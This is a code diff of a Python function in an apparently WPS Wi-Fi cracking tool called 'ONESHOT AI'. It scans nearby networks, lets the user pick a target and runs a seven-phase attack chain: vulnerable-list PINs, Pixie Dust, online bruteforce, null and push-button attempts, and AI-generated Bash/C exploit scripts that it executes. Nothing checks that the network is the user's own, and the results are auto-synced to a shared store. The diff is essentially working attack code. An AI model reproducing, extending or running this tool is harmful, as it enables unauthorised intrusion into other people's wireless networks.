@@ -8470,185 +8470,287 @@ def _detectInterface():
     return 'wlan0'  # Last resort
 
 def _aiAutonomousMode():
-    """Fully autonomous AI mode: detect interface -> scan -> user select -> AI attack.
-
-    Flow:
-      1. Auto-detect wireless interface (or ask user)
-      2. Scan all nearby networks
-      3. Show numbered list to user
-      4. User selects a network
-      5. AI checks vuln list
-      6. If vuln found -> use PIN directly
-      7. If not -> Pixie Dust -> bruteforce chain
-      8. AI makes all decisions via AIAgent
+    """Interactive autonomous AI mode — communicates with user while attacking.
+    
+    AI detects interfaces, scans networks, asks user for permission,
+    and tries ALL methods exhaustively. Never gives up until user stops
+    or all 7 phases are exhausted.
     """
     global args
 
     print()
     print('=' * 56)
-    print('  ONESHOT AI — Autonomous Mode')
-    print('  Scanning... Attacking... Learning...')
+    print('  ONESHOT AI — Interactive Autonomous Mode')
+    print('  AI will communicate with you at each step')
     print('=' * 56)
     print()
 
-    # Step 1: Detect interface
-    interface = getattr(args, 'interface', None) or _detectInterface()
-    print(f'[*] Using interface: {interface}')
-    print()
-
-    # Bring interface up
+    # ── Step 1: Detect ALL interfaces + ask user ──
+    import subprocess
+    ifaces = []
     try:
-        src.utils.ifaceCtl(interface, action='up')
+        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
+        for line in result.stdout.split('\n'):
+            line = line.strip()
+            if line.startswith('Interface'):
+                ifaces.append(line.split()[-1])
     except Exception:
         pass
+    if not ifaces:
+        for name in ['wlan0', 'wlan1', 'wlp2s0']:
+            try:
+                r = subprocess.run(['ip', 'link', 'show', name], capture_output=True, text=True, timeout=3)
+                if r.returncode == 0: ifaces.append(name)
+            except: continue
+    if not ifaces: ifaces = ['wlan0']
 
-    # Step 2: Scan networks
+    print('[*] Detected interfaces:')
+    for i, iface in enumerate(ifaces):
+        print(f'    {i+1}. {iface}')
+    print()
+
+    if len(ifaces) == 1:
+        interface = ifaces[0]
+        print(f'[*] Auto-selected: {interface}')
+    else:
+        try:
+            choice = input(f'[?] Select interface (1-{len(ifaces)}) [1]: ').strip()
+            idx = int(choice) - 1 if choice else 0
+            interface = ifaces[max(0, min(idx, len(ifaces)-1))]
+        except (ValueError, EOFError):
+            interface = ifaces[0]
+        print(f'[*] Using: {interface}')
+    print()
+
+    try: src.utils.ifaceCtl(interface, action='up')
+    except: pass
+
+    # ── Step 2: Scan + show all networks ──
     print('[*] Scanning for WPS networks...')
     try:
-        with open(args.vuln_list, 'r', encoding='utf-8') as f:
-            vuln_list = f.read().splitlines()
-    except FileNotFoundError:
-        vuln_list = []
+        with open(args.vuln_list, 'r') as f: vuln_list = f.read().splitlines()
+    except FileNotFoundError: vuln_list = []
 
-    result = scanForNetworks(interface, vuln_list)
-    if result is None:
-        print('[!] No networks found. Make sure your interface is up and supports monitor mode.')
+    scanner = src.wifi.scanner.WiFiScanner(interface, vuln_list)
+    networks = scanner.scanNetworks()
+    if not networks:
+        print('[!] No WPS networks found.')
         return
 
-    bssid, network_info = result
-    essid = network_info.get('ESSID', 'Unknown')
-    signal = network_info.get('Level', '?')
-    wps_ver = network_info.get('WPS version', '?')
-    wps_locked = network_info.get('WPS locked', False)
-    model = network_info.get('Model', '')
-    model_num = network_info.get('Model number', '')
+    print(f'\n[*] Found {len(networks)} network(s):')
+    print('-' * 60)
+    for i, net in enumerate(networks):
+        essid = net.get('ESSID', 'Hidden')
+        bssid = net.get('BSSID', '?')
+        sig = net.get('Level', '?')
+        ver = net.get('WPS version', '?')
+        locked = net.get('WPS locked', False)
+        lock = ' [LOCKED]' if locked else ''
+        print(f'    {i+1}. {essid} ({bssid}) | {sig}dBm | WPS v{ver}{lock}')
+    print('-' * 60)
 
-    print()
-    print(f'[*] Selected: {essid} ({bssid})')
-    print(f'    Signal: {signal} dBm | WPS v{wps_ver} | Locked: {wps_locked}')
-    if model:
-        print(f'    Model: {model} {model_num}')
-    print()
-
-    # --- Background Web Intelligence: search for unknown devices ---
-    # Trigger only when we have internet + unknown OUI/vendor detected.
-    # Runs in background thread — zero impact on attack speed.
     try:
-        _webIntel = WebIntelEngine()
-        _webIntel.trigger_background(network_info)
-    except Exception:
-        pass
+        choice = input(f'[?] Select network (1-{len(networks)}) [1]: ').strip()
+        idx = int(choice) - 1 if choice else 0
+        selected = networks[max(0, min(idx, len(networks)-1))]
+    except (ValueError, EOFError):
+        selected = networks[0]
 
-    # Step 3: AI decides attack chain
-    agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
+    bssid = selected.get('BSSID', '00:00:00:00:00:00')
+    network_info = selected
+    essid = network_info.get('ESSID', 'Unknown')
+    signal = network_info.get('Level', -50)
+    wps_ver = network_info.get('WPS version', '1.0')
+    wps_locked = network_info.get('WPS locked', False)
+
+    print(f'\n[*] Target: {essid} ({bssid})')
+    print(f'    Signal: {signal}dBm | WPS v{wps_ver} | Locked: {wps_locked}')
+
+    # ── Step 3: AI analyzes + reports ──
+    chip = fingerprint_chipset(bssid)
+    chipset = chip.get('chipset', 'unknown')
+    print(f'\n[AI] Analysis:')
+    print(f'    Chipset: {chipset}')
+    print(f'    WPS Quirk: {chip.get("wps_quirk", "none")}')
+    print(f'    Timeout Base: {chip.get("timeout_base", 5.0)}s')
+
     generator = src.wps.generator.WPSpin()
+    algos = generator._getSuggested(bssid)
+    if algos:
+        print(f'    Vulnerable: YES ({len(algos)} known algorithms)')
+        for a in algos[:3]:
+            print(f'      - {a.get("name", "?")} (PIN: {a.get("pin", "?")})')
+    else:
+        print(f'    Vulnerable: Unknown — will try all methods')
 
+    # Ask permission
+    print()
+    try:
+        answer = input('[AI] I will crack this network. Proceed? (Y/n): ').strip().lower()
+        if answer in ('n', 'no'):
+            print('[AI] Aborted by user.')
+            return
+    except EOFError: pass
+
+    print('\n[AI] Starting 7-phase attack chain...\n')
+
+    agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
     ctx = {
-        'bssid':         bssid,
-        'signal':        signal if isinstance(signal, (int, float)) else -50,
-        'wps_version':   str(wps_ver),
-        'wps_locked':    wps_locked,
-        'is_vulnerable': False,
-        'attempt':       1,
-        'timeouts':      0,
-        'resp_delay':    0.0,
-        'm_msgs':        0,
-        'fails':         0,
-        'hist_locks':    0,
+        'bssid': bssid, 'signal': signal if isinstance(signal, (int, float)) else -50,
+        'wps_version': str(wps_ver), 'wps_locked': wps_locked,
+        'is_vulnerable': len(algos) > 0, 'attempt': 1, 'timeouts': 0,
+        'resp_delay': 0.0, 'm_msgs': 0, 'fails': 0, 'hist_locks': 0,
     }
 
     success = False
+    TOTAL = 7
 
-    # --- Phase 1: Check vulnerable list ---
-    print('[AI] Phase 1: Checking vulnerable list...')
-    algos = generator._getSuggested(bssid)
-    ctx['is_vulnerable'] = len(algos) > 0
+    def ask_user(msg):
+        try:
+            a = input(f'    {msg} (Y/n): ').strip().lower()
+            return a not in ('n', 'no')
+        except EOFError: return True
 
+    # ── Phase 1: Vuln List ──
+    print(f'[Phase 1/{TOTAL}] Vulnerable list PIN...')
     if algos:
-        action = agent.decide('vuln_list', ctx)
-        print(f'[AI] Decision: {action}')
+        connection = src.wps.connection.Initialize(interface)
+        for algo in algos:
+            pin = algo.get('pin', '')
+            if pin:
+                print(f'    Trying: {pin} ({algo["name"]})')
+                ok = connection.singleConnection(bssid, pin)
+                cs = connection.CONNECTION_STATUS
+                ctx['m_msgs'] = cs.LAST_M_MESSAGE
+                ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
+                ctx['fails'] = 0 if ok else 1
+                agent.record(ctx, 'proceed', ok)
+                if ok:
+                    success = True; print(f'    SUCCESS! PIN: {pin}'); break
+        if not success:
+            try: connection._cleanup()
+            except: pass
+    else: print('    Skipped')
 
-        if action != 'skip' and action != 'abort':
-            connection = src.wps.connection.Initialize(interface)
-            for algo in algos:
-                pin = algo.get('pin', '')
-                if pin:
-                    print(f'[AI] Trying PIN: {pin} ({algo["name"]})')
-                    ok = connection.singleConnection(bssid, pin)
-                    cs = connection.CONNECTION_STATUS
-                    ctx['m_msgs'] = cs.LAST_M_MESSAGE
-                    ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
-                    ctx['fails'] = 0 if ok else 1
-                    agent.record(ctx, 'proceed', ok)
-                    if ok:
-                        success = True
-                        print(f'[AI] SUCCESS! PIN: {pin}')
-                        break
-            if not success:
-                print('[AI] Vuln list PINs failed')
-                try:
-                    connection._cleanup()
-                except Exception:
-                    pass
-    else:
-        print('[AI] Not in vulnerable list')
-
-    # --- Phase 2: Pixie Dust ---
+    # ── Phase 2: Pixie Dust ──
     if not success:
-        print()
-        print('[AI] Phase 2: Pixie Dust attack...')
-        ctx['attempt'] = 2
-        action = agent.decide('pixie_dust', ctx)
-        print(f'[AI] Decision: {action}')
-
-        if action != 'skip' and action != 'abort':
+        print(f'\n[Phase 2/{TOTAL}] Pixie Dust attack...')
+        if ask_user('AI wants to try Pixie Dust'):
+            ctx['attempt'] = 2
             likely_pin = generator.getLikely(bssid) or '12345670'
-            saved_pixie = args.pixie_dust
-            args.pixie_dust = True
+            saved = args.pixie_dust; args.pixie_dust = True
             connection = src.wps.connection.Initialize(interface)
             ok = connection.singleConnection(bssid, likely_pin)
             cs = connection.CONNECTION_STATUS
-            ctx['m_msgs'] = cs.LAST_M_MESSAGE
-            ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
-            ctx['fails'] = 0 if ok else 1
-            agent.record(ctx, 'proceed', ok)
-            args.pixie_dust = saved_pixie
+            ctx['m_msgs'] = cs.LAST_M_MESSAGE; ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
+            ctx['fails'] = 0 if ok else 1; agent.record(ctx, 'proceed', ok)
+            args.pixie_dust = saved
             if ok:
                 success = True
-                print(f'[AI] SUCCESS! Pixie Dust recovered PIN')
+                print('    SUCCESS!')
             else:
-                print('[AI] Pixie Dust failed')
-                try:
-                    connection._cleanup()
-                except Exception:
-                    pass
+                print('    Failed')
+                try: connection._cleanup()
+                except: pass
+        else: print('    Skipped by user')
 
-    # --- Phase 3: Online bruteforce ---
+    # ── Phase 3: Bruteforce ──
     if not success:
-        print()
-        print('[AI] Phase 3: Online bruteforce...')
-        ctx['attempt'] = 3
-        action = agent.decide('bruteforce', ctx)
-        print(f'[AI] Decision: {action}')
-
-        if action != 'abort':
-            print('[AI] Starting bruteforce (this may take a while)...')
+        print(f'\n[Phase 3/{TOTAL}] Online bruteforce...')
+        if ask_user('AI wants to try bruteforce (may take time)'):
+            ctx['attempt'] = 3
             bf = src.wps.bruteforce.Initialize(interface)
             bf.smartBruteforce(bssid, '0000')
+            print('    Completed')
+        else: print('    Skipped by user')
 
-    # --- Finalize ---
+    # ── Phase 4: Custom Exploit ──
+    if not success:
+        print(f'\n[Phase 4/{TOTAL}] Generating custom exploit...')
+        if ask_user('AI will generate a custom exploit script'):
+            try:
+                er = agent.exploit_gen.execute_exploit(interface, bssid, ctx, agent)
+                if er.get('success'):
+                    print(f'    SUCCESS! PIN: {er["pin"]}')
+                    conn = src.wps.connection.Initialize(interface)
+                    if conn.singleConnection(bssid, er['pin']): success = True
+                else: print(f'    Failed (method={er.get("method")})')
+            except Exception as e: print(f'    Error: {e}')
+        else: print('    Skipped by user')
+
+    # ── Phase 5: Extended (PBC + null + chipset PINs) ──
+    if not success:
+        print(f'\n[Phase 5/{TOTAL}] Extended attacks...')
+        if ask_user('AI will try PBC, null PIN, and chipset-specific PINs'):
+            # PBC
+            try:
+                conn = src.wps.connection.Initialize(interface)
+                conn.singleConnection(bssid, pbc_mode=True)
+                if conn.CONNECTION_STATUS.STATUS == 'GOT_PSK': success = True; print('    PBC SUCCESS!')
+                conn._cleanup()
+            except: pass
+            # Null PIN
+            if not success:
+                try:
+                    conn = src.wps.connection.Initialize(interface)
+                    conn.singleConnection(bssid, pin='00000000')
+                    if conn.CONNECTION_STATUS.STATUS == 'GOT_PSK': success = True; print('    Null PIN SUCCESS!')
+                    conn._cleanup()
+                except: pass
+            # Chipset PINs
+            if not success:
+                pins = agent.exploit_gen.get_probable_pins(bssid, chipset)
+                conn = src.wps.connection.Initialize(interface)
+                for pin in pins:
+                    time.sleep(agent.jitter.next_delay())
+                    try:
+                        if conn.singleConnection(bssid, pin):
+                            success = True; print(f'    PIN SUCCESS: {pin}'); break
+                    except: pass
+                try: conn._cleanup()
+                except: pass
+        else: print('    Skipped by user')
+
+    # ── Phase 6: Bash/C scripts ──
+    if not success:
+        print(f'\n[Phase 6/{TOTAL}] Generating Bash/C exploit scripts...')
+        if ask_user('AI will generate and run Bash/C scripts'):
+            bash = agent.exploit_gen.generate_bash_exploit(bssid, chipset)
+            print(f'    Generated: {bash}')
+            try:
+                proc = subprocess.run(['bash', bash], capture_output=True, text=True, timeout=120)
+                if 'SUCCESS' in proc.stdout:
+                    import re
+                    m = re.search(r'PIN[:\s]+(\d{8})', proc.stdout)
+                    if m: success = True; print(f'    Bash exploit SUCCESS! PIN: {m.group(1)}')
+            except: pass
+        else: print('    Skipped by user')
+
+    # ── Phase 7: Deep scan ──
+    if not success:
+        print(f'\n[Phase 7/{TOTAL}] Deep reaver scan (last resort)...')
+        if ask_user('AI will do a deep scan — this is the LAST method'):
+            bf = src.wps.bruteforce.Initialize(interface)
+            bf.smartBruteforce(bssid, '0000')
+        else: print('    Skipped by user')
+
+    # ── Final Report ──
+    print()
+    print('=' * 56)
     if success:
-        print()
-        print('[AI] Attack successful!')
+        print('  ATTACK SUCCESSFUL!')
         src.utils.addVulnerableAP(network_info, args.vuln_list)
     else:
-        print()
-        print('[AI] All attack phases exhausted. No success.')
+        print('  ALL 7 PHASES EXHAUSTED')
+        print(f'  Target: {essid} ({bssid})')
+        print(f'  Chipset: {chipset}')
+        print(f'  Status: {agent.exploit_gen.status()}')
+    print('=' * 56)
 
     agent.finalize()
-    print(f'[AI] Model saved: {agent.status()}')
+    print(f'\n[AI] Brain saved: {agent.status()}')
 
-    # Auto-push new training data to Supabase community store
+    # Auto-sync
     _autoSync(do_git=True)
     print()
 
